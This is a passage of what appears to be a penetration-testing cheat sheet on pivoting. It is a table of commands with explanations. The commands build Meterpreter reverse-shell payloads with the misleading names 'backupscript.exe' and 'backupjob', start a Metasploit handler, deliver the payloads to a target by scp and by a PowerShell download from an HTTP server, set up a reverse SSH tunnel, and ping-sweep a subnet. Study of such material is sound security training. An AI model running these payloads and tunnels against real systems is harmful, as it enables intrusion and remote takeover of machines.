| `msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080` | Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following lhost= on local port 8080 (LPORT=8080). Payload will take the form of an executable file called backupscript.exe. |
| `msf6 > use exploit/multi/handler`                            | Used to select the multi-handler exploit module in Metasploit.                                    |
| `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`         | Uses secure copy protocol (scp) to transfer the file backupscript.exe to the specified host and places it in the Ubuntu user's home directory (:~/). |
| `python3 -m http.server 8123`                                | Uses Python3 to start a simple HTTP server listening on port 8123. Can be used to retrieve files from a host. |
| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"` | PowerShell command used to download a file called backupscript.exe from a webserver (172.16.5.129:8123) and then save the file to the location specified after -OutFile. |
| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN` | SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port 8080 on the attack host to port 80 on the target. |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080` | Uses msfvenom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after LHOST= on port 8080 (LPORT=8080). Payload takes the form of an executable elf file called backupjob. |
| `msf6 > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23` | Metasploit command that runs a ping sweep module against the specified network segment (RHOSTS=172.16.5.0/23). |
